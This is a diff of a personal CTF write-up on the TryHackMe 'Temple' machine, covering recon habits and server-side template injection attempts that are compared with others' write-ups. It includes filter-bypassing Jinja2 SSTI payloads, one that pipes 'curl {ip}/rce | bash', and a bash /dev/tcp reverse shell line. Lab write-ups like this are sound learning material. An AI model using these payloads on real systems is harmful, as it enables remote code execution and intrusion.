@@ -50,7 +50,7 @@ While I was trying understand how to understand [Web filtering](https://en.wikip
 ![1000](algetshelpsfromchat.png)
 It was one of those machines that I am happy I did not have to learn the painful lesson of infinite directory scanning. I think my "ok" personal policy on doing this mostly because I just do these CTFs and not Bug Bounty is I need to learn stuff and this is not learning. Recon in the back is awesome, but I think I need to adjust to a more Bug Bounty Hunter continous discovery method. Also Al has had probably with feroxbuster missing pages and that it also can basically DDoS a site really quickly. Given these relevations and other relevation:
 
-Be more Tacticool - do not fear the 403 and 302
+Be more Tacticool - do not fear the 400s and 300s
 - Go back to gobuster for inital directories
 - Stop, observe and note potential targets to start feroxbuster and ffuf from 
 	- What is actually a good target for this and what are likely middle directories that are good to recurse -  Pushing beyond the 
@@ -186,7 +186,6 @@ Restarted the box encase it was being a idiot at some point; still failed so I t
 
 Another Internal Server Error.
 
-
 ```python
 # PATT
 {{ [].class.base.subclasses() }}
@@ -222,7 +221,37 @@ I tried using the [Flask API](https://flask.palletsprojects.com/en/2.2.x/api/) a
 {{run(host="0.0.0.0",port="9999",debug=True)}} 
 ```
 
-[Progess into the internal server error](https://www.youtube.com/watch?v=-NhqAaRfxEU&list=PLi4eaGO3umboaOqaot7Oi7WszkSWRc4Pi&index=12)
+[Progess into the internal server error](https://www.youtube.com/watch?v=-NhqAaRfxEU&list=PLi4eaGO3umboaOqaot7Oi7WszkSWRc4Pi&index=12) , I decided that after the eternal internal server errors of doom hour or so of days gone by I checked three writeups
+
+
+
+
+Although [toxicat0r's](https://tryhackme.com/p/toxicat0r) the box creater [writeup](https://wiki.thehacker.nz/docs/thm-writeups/temple-hard/) does not contain enumeration (other than `{1*2}`)for the SSTI class and subclass numbers: 
+```python
+{{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("curl {ip}/rce | bash")|attr("read")()}}
+```
+This would called and `curl` a reverse shell that is then executed by the piped `| bash` segment 
+```bash
+#!/bin/bash   
+bash -c "bash -i >& /dev/tcp/10.9.1.132/4242 0>&1"`
+```
+
+[Scarecrow/n1gh75hd3/mx9tff4hha7clo8mah](https://scarecrow.gitbook.io/ctfs-challenges-random-boxes/v/temple/#testing-for-ssti), write up was really great; sadly I  uses a Polygot `${{<%[%'"}}%\.` to test for SSTI. And unlike the box creator contain methodoly for enumeration. Similiarly there is a reate graph of deduction of SSTI to enumerate the framework. He fuzzed for bad characters as he went, which I generally have learnt from others and from other exploits that should be done before trying to exploit an application. 
+
+Interestingly Scrarecrow tried to create accounts that would in sequence:
+- create an evil config file
+- load the config file
+- with netcat on Scarecrow's box, establish a connection with the third account
+
+Scarecrow stumbled into a few of the bad characters with each attempt variation of getting RCE until.
+
+```python
+{{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("id")|attr("read")()}}
+```
+
+Instead of guning for the the indexes of the classes to reference them like with PayloadAllTheThings Scarecrow success was just to reference the classes and subclasses very simply as verbatuum.
+
+![](scarecrowgotbill.png)
 
 ## Foothold
 
